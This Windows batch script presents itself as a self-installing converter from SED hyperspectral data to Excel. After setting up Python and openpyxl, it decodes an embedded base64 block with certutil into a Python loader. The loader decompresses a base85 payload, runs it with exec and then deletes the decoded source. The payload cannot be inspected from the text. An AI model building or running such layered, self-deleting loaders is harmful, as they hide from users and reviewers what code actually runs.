@echo off
setlocal EnableDelayedExpansion
title SED Hyperspectral - Excel Converter

:: SED Hyperspectral -> Excel Converter (Self-installing)
:: Developed by Bipul Neupane, PhD (DPIRD Node, APPN)

set "TOOL_DIR=%~dp0"
set "VENV_DIR=%TOOL_DIR%sed_excel_env"
set "B64_FILE=%TOOL_DIR%_app_b64.tmp"
set "APP_SCRIPT=%TOOL_DIR%_app_run.py"

echo.
echo  ============================================================
echo   SED Hyperspectral -^> Excel Converter
echo   Developed by Bipul Neupane, PhD  ^|  DPIRD Node, APPN
echo  ============================================================
echo.

:: Step 1: Find Python
echo  [1/4] Locating Python installation...
set "PYTHON_EXE="

where py >nul 2>&1
if %errorlevel%==0 (
    for /f "tokens=*" %%i in ('py -3 -c "import sys; print(sys.executable)" 2^>nul') do set "PYTHON_EXE=%%i"
)
if not defined PYTHON_EXE (
    where python3 >nul 2>&1
    if !errorlevel!==0 (
        for /f "tokens=*" %%i in ('python3 -c "import sys; print(sys.executable)" 2^>nul') do set "PYTHON_EXE=%%i"
    )
)
if not defined PYTHON_EXE (
    where python >nul 2>&1
    if !errorlevel!==0 (
        for /f "tokens=*" %%i in ('python -c "import sys; print(sys.executable)" 2^>nul') do set "PYTHON_EXE=%%i"
    )
)

if not defined PYTHON_EXE (
    echo.
    echo  [ERROR] Python not found.
    echo  Install Python 3.8+ from https://www.python.org/downloads/
    echo  Check Add Python to PATH during installation.
    echo.
    pause
    exit /b 1
)
echo         Found: %PYTHON_EXE%

:: Step 2: Create virtual environment
echo  [2/4] Setting up isolated Python environment...
if exist "%VENV_DIR%\Scripts\python.exe" (
    echo         Environment already exists, skipping creation.
) else (
    echo         Creating virtual environment...
    "%PYTHON_EXE%" -m venv "%VENV_DIR%"
    if !errorlevel! neq 0 (
        echo  [ERROR] Failed to create virtual environment.
        pause
        exit /b 1
    )
    echo         Done.
)

set "VENV_PYTHON=%VENV_DIR%\Scripts\python.exe"

:: Step 3: Install dependencies
echo  [3/4] Installing / verifying dependencies...
"%VENV_PYTHON%" -c "import openpyxl" >nul 2>&1
if !errorlevel! neq 0 (
    echo         Installing openpyxl...
    "%VENV_PYTHON%" -m pip install --quiet openpyxl
    if !errorlevel! neq 0 (
        echo  [ERROR] Failed to install openpyxl. Check internet connection.
        pause
        exit /b 1
    )
    echo         openpyxl installed successfully.
) else (
    echo         openpyxl already installed.
)

:: Step 4: Decode app and launch
echo  [4/4] Launching application...
echo.

if exist "%B64_FILE%" del /f /q "%B64_FILE%"
if exist "%APP_SCRIPT%" del /f /q "%APP_SCRIPT%"

:: Write base64 lines then decode via certutil (no escaping issues)
(
echo aW1wb3J0IGJhc2U2NCwgemxpYiwgc3lzLCBvcwoKX1BBWUxPQUQgPSAoCiAgICAiYy1yTVc/USt7
echo amxLPVM+dishTFJORW4hO1duMVFreHVZYTFRQU1eQG1KJWw9dDU2XkBCKFZZazlzcjdGYmdKNCV4
echo RjM1anhLREUzSnV8QElpPT5fUFJWOEw2NzcweEVeel8kcyIKICAgICJfazgkXldmWjNATzRAN3xN
echo Ql9HI2Q3R3Y0bjdmYEkmUlZ7Qm8hPElrJTQ2bXhAVT1DS3FlYj5ld3dVPz5fazFecVdeSzBNTiNm
echo NDxJUWpzbnB1S0ZlPUhxYzN0ckglJVQ0fXVMIgogICAgInctfGlueUoqUzc8Pm9eYCZqYFBJVmto
echo WSk7RThIQDtpa31RYzxLajFvMUkycytHZk1ScE0/dktVeXF7TDw4aGxeYFd+LUF3TXpYVSEhK1pt
echo R2xfIUxCNkk/ZE5EMUswI3B3MEwiCiAgICAidWZMby1aKz5KMGJgYEk5aStgQiNXeTtQN1khdF4p
echo K149YlI+SU1tS3dIfnA1e15SZlA5fXI0ZDw8Q0ZDZjM0VFVwTVFtNjUxOD8mSkE2OFBjNUprYyZW
echo TCVvTjQ/U1dsaWA4VSIKICAgICJ5OElDdihXN1RhIT4xPU5qbj9fdV9kaV5UTjJBZnshUmU5RmRp
echo VFRHKWtyKSNySHwxWDl2X2NoVXhgUFo7aj5RMVhrQ3FkeGwlbklfbH0rcGpuPztYaGwrXjk7bWV+
echo VlhxRUgpIgogICAgIjY7RUJ5TzxtQU45KGF0RGZ0ZD4qV3RPblooRnZQX1Vofi1jfEJ5PVMpI3ok
echo P0dRMWkocilRKHtsU2BvYW4pSnB2anV4bntNdz1Od15FbU9ONVdqKi1iTFh8WTtQflMjT3d4Rnoi
echo CiAgICAiVEFsRWVQZnszeihIMG45YVdgNFRKYlVrXjFhOypMPXF0V2heNEx3R2lGMXEoaj51e0Am
echo ZCpWaGZATForISNpai08Qjh9bzx1aWJoKVNTNVN0QEE0SzI7WFRHXkp0bSs2OXhEZCIKICAgICJ5
echo aEY2JFkzeHMmVj5qQH1JcDl5QnBBeTElP2l+KyFJN3tjd1RRfCUqSiVeXzBOKzNSdSFkZG9YODAw
echo VSR6cW9ZTlhmOSFOTEV4dTY4QH1xMmQoSy12PHVNTkBGd2lLRGZsRU0hIgogICAgImdSRGZ6PEdD
echo QSNKVjNZYFJGaFprUWgwPmVVNlZUOEAobllDWHdCbl5ue2JQejVzT3dhNks7V3BBZEhzdDxMRm9D
echo KSRqdHVjUTFPTU5iJlhBKT13XkcwZF4tdnkkZFc7Mj8yKFYiCiAgICAibF89UWBzSD18dl5tNyYz
echo MjNiJXcwcUpHeHchTz1XU31ydVQreVl1dVUpZCtCQERBMmNwUVAjbkNpTkc0ITNhZj9GdTc/a2I3
echo RDF0bXJZMGprQSllcko4NEV1enp5YytEcyRVVCIKICAgICJ2dTJoYGxEVFIyd0BPa29WYTMrP21N
echo emVYY1pmMUtjZDIlbiQ/czZSdlRLTlEqVDUjNFliYz48YnxDYElpcm1PZjtWTzN7Zll6REkwU2da
echo czE9USU4MF9CPV4ycTxAOTUteExOIgogICAgIituSkBnSkU7LURlalZublFOWWNYNVF5IzhlJDk7
echo dnhGbU9fVFlXOys8eFZufTNsWEFweCFAPDIlY2J9YWFQSH12Qn5JbUBjWkA9Rjt9MCNHPypJM0h6
echo TDVXNXVyeUkhNEJ1WGsiCiAgICAiLWhOcF9feE99OC04a1YrIWFXbGVaMFYrUk85YkRCVmJJXlY5
echo OShwbUZuYUkhOSVkZ1IyeUMtdDJ9JjJjZnlMSHkoOFFLZEMpdHAoSzcqSGowQkhealZnNXNoMXY0
echo VDNxITxDKSIKICAgICI7az9ecytAOUkmYVIpeCMjfWJMXjFkIWF6Qm0mI15GfHUmKCsrWVBuNlJy
echo bWRwbENzVyspWCopK1dUeDhMfmJnZTl0d2tjOWZoMnNhUkhleTUhcj4yWEN5I2lCRVlnZnZMfUEl
echo IgogICAgIlAhc3U0U3FncF5rKzc1OGBwWUY0YihYOzN5RFU0eSYpTnJmaVlaaGswKklfKTIoUTRq
echo QlROenAjd3drRGJCSXFVJj5rMnVVazJgazh4fCZ2KDtPQUNLWitVZm9DOXM7UzJQQ1QiCiAgICAi
echo bmp7RVkrNFM0QVQ5dDxXRzswZnUrJkUyO1Ahal9Md3tLV2clc019MFc+P29fMHkoODB1NlMqYTYy
echo MVpYbCFafVJWcitmV1NeK2VZUjNOTUY8cjBTdjc7PVV6IUZkRE04cHM2WSIKICAgICJHWVE2R2c4
echo fU9gKF55YzF5M2hJIXdHRmhgQnFiSkR1UkF4RXdINTQrbHZEQGwtZlZ8WnhfdTJqLVQqOU1YbHlT
echo Tl9NZyQ5dzB5bmt2dmlaQihnM0MjVUp2I05RaFJWcFFocDNgIgogICAgImgoMDZaWkRQMDRIJkVN
echo XmJlZ0ZGUkJoKDgxdlh1dCRSaSk7UFpNeGkrdSlycmlXZE0xVXpQM0hsO0RgdzdUcFRTZGpYaXJj
echo SSs4WE9AKiEqNShjTSR4QVJ5enQ4M0w8JTVZVTwiCiAgICAiO25JJGojRVhieWEqZ0J9YkJJVDVe
echo Wn1ZcSgjJlpDPi1kN1hwO3pfc1hENi1QKj5MMWxsLVRJamd3Xm01c2lfYH1BdF4qYGBRJjRQWmZE
echo PkszdGw8bFpha1RydjA9WFZ6UEExaSIKICAgICJ7Mj0xWm5JPTJOSWNMQllfQUhLOE9TNWE/STJX
echo WDYpSUp9TDlBWFk4NVoyOVgwIVpybmkyaV8qXmpvI3Vgci1ubyhKI2xOYjlRPDQ+LW1XTkZnbXsm
echo eX1rVk1BfUQ5IS1lTkY8IgogICAgIk1PMEh4aXxIS1AoU1dMP0NjUE9MX3l7eD8lcmxBeSM/aV5p
echo aV91N1duejUqKDRQPHJJNEVRdTFWRVo8VXtuPWM3UG90JiRIamRJWFRGPylITDh7Pz5ya0JSdGl5
echo YmhrZklAJCoiCiAgICAicmZWOFc2ITshY0dNeWFAVDRiJSFZVWp8dG1qbXlCbVNzc0Q4amBNa2A8
echo Q1RPOWVPPG5BRURzNEwoOXNoNG8lflpXTylTMypDelV4ZmxRbHgxRE98aTB9S1QrVk1zSiFfNU4+
echo cyIKICAgICIoQ3dCdnEwb0lJekspSj45Q0AxelY9Y1p+QWsrKCkjZmN4PCtYPV5ZMHtKJHApdG1E
echo dV9KNHk4KytkKVp6e0pPNG98fFpvXmxuaF52USk3aTVqQU9KZllFPm1eR0M3QGNleEJVIgogICAg
echo Ij03aSVpIWp1KmhybkgjZz04RmtwQitfS0NySHVfU1poPTM0bH1gVyZwVE04SVMldzROV1p4d35X
echo PSFJWEI0LV89UndaKXwpOXlNVVE4XjtPZkZIUE0wKm5fRTBJcGZVfEVuK14iCiAgICAiYlZ8OTky
echo ODJLUjVKNHY/aT41TklwKEg2emtnQ1UyRWomQVVFYlM5SShCe30yNWRTNygzPXBESENaS2hhcjZE
echo O0AwNlVNP1l+aDkqU3cjaSNEWHRVQTkrP35TSmFzV0s4KDkwdSIKICAgICI1b24hUWgyaH00aVFp
echo Xig0NHlibWhpPU52MCZCV2pwZykwdXRySHZCWXtHfkotTEBvUWZMSktsN3xpbyZTKlpZVV9CIWBS
echo SH5DTXIwYFhKb2tvWTBCe1lGTUNOTS1Ea2tUOFd5IgogICAgImlvXj1oXil4RF80Z3NSZjU4WXJX
echo NWN9LWtTcjZtIWp0bU59YnpoVDU5Zn5hJkx6bnZeM1d7OCo7fCRWVVZHYUNTNEQ+TCNeVnpxVUFX
echo KTJqIWg/V0gyQDxeZzkyZTE7SjM7PDEiCiAgICAibm4pQF5WMWRpWlp7SzlVY0pnPzRPckd+Mz8z
echo bG9uN3V5QFJPN0lkYW80ZXRKbzR9OEBOS3FQKyQlemZEQTlLYHtjO1RYMTg2NnZ8MWN1T3pOOTxV
echo dkJZPVhaXlE0YXEzfCtgYSIKICAgICIqNm9hbXIyQmJmcisjT2R5bDdBOFA9S1ArO1E4UUNhRSQ7
echo KUdjO34mIVZsZWRKNW8rdCs4PTR7cEJfP3NNVDxGSWZvaUc8K1M9MHd1WH15cT5yPnFoO2lYdG5n
echo KzN+KXRtZWVHIgogICAgIlQyJlFlVXphPmRrPnxDOCR2ZXUmdn5XTHxuQkljUkdhKzBEdjxGfWho
echo azJKKENFNlNKVk17U344Z3U+fGNiMEMqRzREMnhkal8jbUpRdDxgOUYtbldMN3s8YVUzNzJrSW1a
echo QUIiCiAgICAiRiFYeDRHZUs1VWBQJUhZRE9FPSZmK054ME5FS2JJcTNiXlhWI0VEK1pfbHAyJFV0
echo OSk1WWxydm09dUR5PU0hKnVGZVQoUU5COXd+UW0wcjt5Xzhfekx9OVJEPm5PZSpONntfMSIKICAg
echo ICJ0anQkfGt3NUY7S1FPUF93aGdseXVGPWM2ZE9nTkdUSjV1VkMqZnR5VlUwR2o5QH4oaGAqJlBm
echo TCtZbWltSz9JYThKNndASXNfO3RGMEQkMEdoby1vKi01cj80cXREO015fUVEIgogICAgIipBYGpR
echo OFpBajFfKVErezBQcjw8R2ZKKnlMMENXb0VtWnBlQUJ8Yl9IYm5ZX1QqNV9GOUs9UG9FTSN5YWhW
echo WkdPb0BCRn4wMnlXYEtwOCZAb041O05OWkZzRitze1J3aVRoZ0AiCiAgICAicDY4bjsjSE5ibXlV
echo KFR2TTh8RiZjKk5lSWp7NHl3U2IxNzNEYWQyWG0/cyNIME9NZyE0IURidll7O2IpMiFtYHd7NmJC
echo YmtfZlQ3JVN3QVRua3NxXy1rUXsmUCQwQkpCRkNUYiIKICAgICJNVSVSOXYjO2hCc1FNVTEmV05t
echo TmJvS18mQXpJU3hzamteSDIpKlk1JSpSP290dEFNYWwjR0V1ZXdSZzE0Tz03SllQT0lzWjZYfEFU
echo JTRhQjUza1BOeSNCSnJKXyswO1ZaLUlwIgogICAgIk9tRlMwVGp9QmAhRkslNlBhVmZoY3JldyVz
echo QVJSbyh6dTx5JmpVcWxEViZwT3BjbmpNMTVMQlF7UWF1ZWVjN1gkWVhFVjZoeUAyTUdaZXZSb1ZH
echo WUBPeWpXQWBTN0NLREtgS0ciCiAgICAiX0o0RTcmPDhFUXdaJHIyc25IfH5yfllnZWI4fGMhOzRa
echo dzxkdVAxejFKN0NjJTA8JE12eGxXMlhTP04mYTgqNzJMdkIjYTF+VjM4NyUmantYXmY/TTlCckZQ
echo TXp6X31eKiMpRyIKICAgICJoeEJETD1zdmVmcCFVKzgrK3V3ezcjSlVAeXlhbXZHK0p0czBeSH5C
echo Ny1tIWYocV8wd0Z4WCF5K1NPP1VsaGM3fGU5eG5KPURXfnVfZUMyRVhAT14wOHVpb0pmT2JrK2Y9
echo dEx1IgogICAgIj1VQm04Wnl+UFFtIU1YWCEoUVdfQ0txRWFfSnBhPllqZypoM2htPnRhYThFTHY1
echo PThRU1VPcndhMkojKGhvdTZBV1hySmZZOVNVMTMmWGttQHo9Xj1xO04zWj1+en4pcztTNCYiCiAg
echo ICAieWBPQF9WckMqTjVPWHYtZWUtdDJDVHtGOEJHY1dscjV8Rk0zWntLZ2YhPyp2UXxEbnhkNE5u
echo dmRNVFk2YmdnPE41dUlxRm09S3VgbERTSkVKNHp1dGI+S1Z0JU9HJXR5c1AoPiIKICAgICJxc1Yl
echo K2ltaSpoU0g7bilIYz99eD1fZWN9YHZfTzUjflplbisrVVcmakB4ITY4XnZJI1FvRjApQlkoTEgq
echo bFdKUk03enh7PHxxNGd6SzFEJjFRbT9eSCpVIWclWTV1fDtzZXdDIgogICAgIkJ5Rj5raT9nPlU1
echo RXl3dDhfYzx7fER+S01oXl9aZ0xoaldIeG55T3ZXQTMkY1o7P1duLXYyeig0I3RxNUU/aHFsIT5a
echo fGpqRlB1UUFeSEZHbVZXSG5ZbHZUP0pLSjU9KFg+K2AiCiAgICAiUncyWmIqb1VxYUpNYyg5Rmo+
echo VjNHSUgqUVVheEsjYHdaMHtgPU10Vi15V15OaW88V1otIStkU2EySTNHV3hUSCluWHFYR2opOW9j
echo c0sxPihKRWhBPXJDRHkpUk40UCpxSzI+eCIKICAgICJHcW9tSmlgVGE2P34tZT9yODhaK0pDTndx
echo aSElcT9CYG5GP1hOV2EyLVhfZD5ubDYrNmxQNVU/WUc9T198QmhCans8dS12X1c4QUVaNDFKeHtD
echo TVI7OSFWNGJBQ1ZWQ2N3S2x2IgogICAgInIpMF9qWWZxMDQwOC19XlIrKHxyLTNNPzJZS2ZQaXlJ
echo SHV+c31FPWlsUEZILXhkbnRJWVpkVjVUdDVxIXN9eEt4QFo9R3hKbnU7NHJydjt6OG5KPnN6Vyln
echo fk49Xj9aSnRrcEsiCiAgICAiMzY/UHZIP2V7NmE1cWpLWEljaE1ORyl4UC1uMC11M0FCbnFySDF3
echo X19QeD8tVWtDVGdfPjxlc3p+RmdzYDRvY0R1MnNzTTBMUHQqKS1HdzBeays5Tj1ZUzUocE9DXill
echo e0NJMyIKICAgICI+VFNXX1hkWGY9TkN9TkQyKzFka1VQeCZuO301TSROfCVQSk44XmFSaFM2NTk9
echo cUR0c3p9dX5uIXoxPSltNDJHPSMrKWYmQXcyX0VGKjZLVVVEOzFjcUdjfG9yPUtEd002JFA+Igog
echo ICAgIk0zM3pQPG1aLUA+YSMmcTVwaTtkdFdNPl4rZWd7aEtgdGdkQ25TJUw5cHA0bF9jZjwhKFZV
echo KmBtZVdDKjcxTFU0NjA2SWBUK2Z0ZzdwK2sqem99K3QofEBzQEorQkxtV1FRVWMiCiAgICAidXxF
echo VX1CQzU/flRYbiZOXnhPTXtAfGkme1Z9OXJKSFJQIXV2WH1VKk5tajxBbGYlKlFedzNacXo5OzNO
echo RW9ANW9UIWhiZWghQWplNTkkfnFGKTVaUENxaE1tYlBubkQ4dXVgTyIKICAgICJpLTFmN1BrUXR9
echo QmBlZDBHP2h0QWJDSDlUS3tCbm9oYnhkeGQpdTRWNDtWbXZ0akc7Mm9vKlJydzJGUDA7JDlQYlUp
echo R0hmJiQ4fVEjQFM2dj97bXs0dFp9dShHa0syZSlVMzYyIgogICAgIjgrWUF1JE1xb1VyN0NfTkBQ
echo Nmc9OHhSIT9MWTFZKTZmemg0ME1GYDc8YS1qTGhedmNeSy1oQFQpYzMzMmJHT1NmcSE/cUkzYmw8
echo eWBLcUw7UlYoaW13TnhidCk0R0lGdFllTFYiCiAgICAiamt1PjUrenhSMDtBTzhmMVZySztvfSFj
echo UXNeQnBYZF9FbCopNClZMVI/STt2bUNIXk03IVJTTXJ4UHJXU0UxRiZ5V0F0WiZePn4xMHYrO2Yx
echo KDk2RChKYmFrZzdyM1N0TXJDZSIKICAgICI9fkEqS18lNiFJI3JKa1A9TF96djVeZnFFcFNyNism
echo eXoleEptNTVqXzdCPEtKXk07XjMlemJoMVhKTVZZJVg+KFFhdU82bG5WZ1FxaT16b2dBV1gkMypA
echo SFVmSmJ7ZjJBenVrIgogICAgImtTcWBiKTx+O1VLRG1XPC17QytibkNVPiFTITw5c3AzeGw4JD1p
echo NzBodkdjOVNZSTJ3PXJ4Zy1PWklTd3VaTzQ0aWMtRXotRUBeTzNNLTEoNk05cVVJJE5iUDk1fURQ
echo PDxKM0UiCiAgICAiekJ9Q21nb2c+OXhncW5sdE8yY1cleDhYUipFemkwZlEjTlBDKnh4WiZHfkdN
echo UE9iKVc5bEp9IyphS2s4LSZWa2A9fClZfklaSSNHdjI8T1cmZDtNNnAzRiVpWlJjQU0mR3JuciIK
echo ICAgICJMYHlBJj5Ga2k9Vlg8XmFZeXU+cnVQWiNjQVcmd2hfNDlWKXRrQndDQX43Q3lNIW53Q1hK
echo VyFJOT0kakBkM3VVPjJeNzg3SFl8UmFmY01kP1FgIyNFN0lvY0VQfXRzZkJxJU9tIgogICAgIkpK
echo QE8jYCpmPFlQY282SkkqRnFvS3I+YTBERUxXdVhtNDs1c3d0ZGk0UlF5eU5lRXFyVnF6eWUpalFR
echo PUo9ek1OI2lBUmQyNkgod1JFP3tOZTc0bT1tT1M0MTlgM1o5XjhrWnIiCiAgICAiX0o9QlomfCtq
echo VWl4RC1DckxjTmg7QDgkRV5HSFplPiFNTkI7PUIxJnkoMkllKFBkXzV2OyVYQ1o0PD5KOEloRV9H
echo M15NKVQlPlppMkl3NzhUaColSSVGdW83bkByVGwxPj4xQSIKICAgICI5T2N4aW1ldF92KUphMjcl
echo PmRPP24qaUpTKTRrYDwzXz91NXhSakBfSCR4cz1XRVRrPUlLQSp7eGhBN0lvb3hkTlFwMiFxIXEk
echo WE5CZ2h0ZStTTTJoRTA0Xz5EcSkqTXYjLX55IgogICAgIjRkU3s3KHFsYyN7U2gpblZfcXBuRS1s
echo JGxAd0FRfWNIXkVMT1AhcDlmUCZTZipVaX16YG15MzxKfmJINDtrX1BYX3RXciEocU5fKndEYk1R
echo dzl8X0Eycl5VYzh+JDNgNDVZVGEiCiAgICAiVEU+PSlZPHVfRkYxOHZ2WUltZzc1QDN7RnM0UE0q
echo ITI8cjZFPnRpM2xALUpqciY4biVUKCtDc2RWV2xJdnVzUy0hWkkpfU1RQTE/dmY0X2xRUGBNV0k7
echo WDFESnhQOUU8KikhOSIKICAgICIrU0gwfUxRODlvYzxYSXlQQCVIWjdWZmZeOzBHQCR2Kzx3b2tt
echo bGJhS1F5ckBfU0lMb3JTMjwwTiFjNVdBQisqS1M8STtIPnJjVDJ5czUhZUleOFVDRmtya25IQlFs
echo TXU+MF5LIgogICAgIj1jfTFtO0lhR2MtZ19gPTBQe0g0dHtyZ2BQTWNqcU5EJTIyVU9KeUsyfCZl
echo RjNUemtWdl9kKVooey1yTz1XZUFiaU1uVyg3KHhHZXUxTCFgam1qVjwhJG1VRl9uVEZ0T2NAVTIi
echo CiAgICAiTDJKa2FZcjtrYCtuV1h0RiRNO0Y7UDh6MVZPYFVOYko1UClxc0pAJkZVdiVnUHlRc2Jo
echo KngxKipRS304WnR5R1daR01CSG95X3N7ZD5xQjVAeWJzVV5xNDFuMnxWV0VXSyRDZyIKICAgICI3
echo Kn0pNzk7Kz9Uan5ORjJmUXRERWMjOzJGZmt9RHhgfHkyOypLWGwtaEQtMUxfYVRGc1h+fSV+UD1T
echo fkhnQH5RPjYpLVNTcmVYdVhDTj9PbiEoaWg8amY8YHtwMylJfF9QY0AoIgogICAgIiR6bisoWlZa
echo bW4/NC1TKXooWjVLdi1WKjxVRV9jKmAydSV6XlFfUS1SUzRmSlIyJUZhT2NRaVRlKkIpayE9ZllI
echo KEp1QGdIP3U+Wmk3N2tCbCtSQzZDJVY7PnpNPzc0SVhIOU4iCiAgICAiUzR+WShgeSN5QGp9OUxe
echo SDUqZ1IkfEE1XnRpeGl2b2gjOE9JTkJxdlU0Y0xvVWBGMjV4Rj1OKlZWRXtQK0thc2RSRkM4OGFB
echo WDYqSj94Ym03bldrTElocTdCR2ZMWmUma2RKUyIKICAgICJmT3IpeT5MM0EzSEBmZ3V4MjBRWWtl
echo ZCEyZG1XJjImQklZYzNgfkkpeUxIMjRQMXtkMyU+aSsyY29JZ3tuY1IzSSNselcxNFc3IT18NTQq
echo ZHJzUE9Ld1NzNihjTXsxKyFWT31vIgogICAgInhEaTNmb2ZNaUM2dFIhKSNpJjgzaHhwbGVBRFVY
echo OUx+SWtTQWhacnNFYTFzSWVYelNsOWxidXhGT1dtS0YkUkBJZTZeOUhVfGxzamw9JmdyeiQoRT1i
echo c21BdXleaCNGfE5hbD0iCiAgICAiamA4TiExWG9KYVZBRTxZY3tmalhZT1VaUmp3WVBeSVdndEEo
echo TkpUKEhtSn5QO0RzZmZ5aHgjTCRoRUtObzArO1hfKHhmZSQzMyNPVFg4ZUppRCRfYGBvQXtJamZN
echo X2h3anM7biIKICAgICIzKmFVPjEjITdpVlEwNU1GWE17X0J3OVZDZTF7S1NlbVApZkwtZWNnZVNB
echo M0c5OHAockhpWHJzKnBaOTA3WTZAVj5GJlQmUkxAP344NVlSOFF8XzVDd3dqRk5SJiFHclhXP2Fe
echo IgogICAgIjhITWdSIU4yQ3pzeXp7V0UybEF7cn5WKT96T2l1KT57YnpLeUdzbGEwQjVVQ19vKz1v
echo Vm5uQ3F2MGc5TShmWnt7Tm1gZyRPTmp3P0xMTFIjNEJ4ZmcrKjMqLXFgd2VUODI5cTIiCiAgICAi
echo JWkyTVdUeGE0UzR5XlE4NFIrZ1ZPcE0tI19tNSVyZEhtSiRQSGg/X284QE43P2dNJH1TWWthV19t
echo fG1mWHt4MHxNT0YySFNqckpzUkZON0xQbV95VmZkeD1Tc2VDWWBXJTFCNiIKICAgICJreTFUZUY5
echo PTloMFp0di1lUmF6IWtGdjA7ZGNufUxSYH4/cGRhY2BiJn10d2RUbE11dDsrRTE7YXxAenxZckde
echo fFpCZXpOPkRqKkpvNVhCcnVNMyM1PndDWmQtTkN+WFVBe0xzIgogICAgIkhORUlRZ3tnXngxeUpR
echo KGRxRTlWNmdvU0IrKiU5KjtBQjsqRlhsTSQlJXJZcEtvNUJDIXo8TE1jMz00PVI3RWk/S09PKGM8
echo OXZ+aVE/OHRtOz9QQlorJXY0YlRtIW9zO0tnZWAiCiAgICAiZCYyU18qak1idUdpJlEqVCpXMkNl
echo NVJEd0t2P3hZT0tRejBkTXkhMypaVkFTb212KVVBNGpYZXFiPnpjQEc2bmFqZVJhcHI1JEhQWENX
echo cE5zcGklZXBaMmJGPDgxTUlONHlFfCIKICAgICJmZHVAdEBic0pSJT54UzslfVBFc2d2eDNfT2A1
echo Q0liTGxSWT08QTdiOV5LP1pYdytITWhxQnsqI0VKKk1YXiV2IWVEQl5UQ0o5dztVM1pgS1pyRDRT
echo cGt6ZzVhais7V140QDJDIgogICAgIm1NNG1qSU8zaytzRytCI3RsS1QoQFAkPWpUWHhnQCpRSF4h
echo JUQzTUEtWlpKcSNwfEJWIXxlMlBuVEpgfF4qcjNgc0NZeEpeKGoyO2J+LWhGTWZsWVFteSY0Pj9k
echo c3tnVXJsKnUiCiAgICAiJTdqNy16JnRFcT5iNmFHfEczUV8lYWx6dkRsMl5qYC17I3EjIWpNO3xB
echo akdpZFFTdlJjJDY1PW1yO1IrLUFsMzYjeEx+QCo8SVhLe2E+eW84MkozOVdVPClAckRTe01WfGFx
echo YiIKICAgICJpZUtFekVCb1FKRT0/OG5LZkcwaDlZXlI8dk1iayVxKVU/Vis4RGc7TmdRfGQkXisw
echo Iyk9anpRWTBtQmI/JVh4RWxjdSl4RiQ9MyEqfkpFaDxzeWhFY1A3aVY3UGBJWC1SbzQlIgogICAg
echo IjlpSy1OeChPV15wKCZpRSF7ekg5QHNlRzUqNTlHejJOTjtKZntqNHl7ZDlQSEtANHZ3MDk1Kk4k
echo a1kjRT8zO2U7QmojdFZRbVk8VGolbn1BP2A4UlgqV24tU0s8cGx5MUBaQyMiCiAgICAiOX1rYkMr
echo I0xybT1RMTI7O1gqI143PWspSFk7TXszRDJPOFhgaFV4WGdIciIKKQoKZGVmIF9ydW4oKToKICAg
echo IHJhdyA9IF9QQVlMT0FELnJlcGxhY2UoIlxuIiwgIiIpLmVuY29kZSgiYXNjaWkiKQogICAgc3Jj
echo ID0gemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iODVkZWNvZGUocmF3KSkKICAgIGV4ZWMoY29tcGls
echo ZShzcmMsICJhcHAiLCAiZXhlYyIpLCB7Il9fbmFtZV9fIjogIl9fbWFpbl9fIn0pCgpfcnVuKCkK
) > "%B64_FILE%"

certutil -decode "%B64_FILE%" "%APP_SCRIPT%" >nul 2>&1
if !errorlevel! neq 0 (
    echo  [ERROR] certutil decode failed.
    pause
    exit /b 1
)
del /f /q "%B64_FILE%"

"%VENV_PYTHON%" "%APP_SCRIPT%"
if %errorlevel% neq 0 (
    echo.
    echo  [ERROR] Application exited with an error.
    pause
)

:: Cleanup - source code never left on disk
if exist "%APP_SCRIPT%" del /f /q "%APP_SCRIPT%"

endlocal
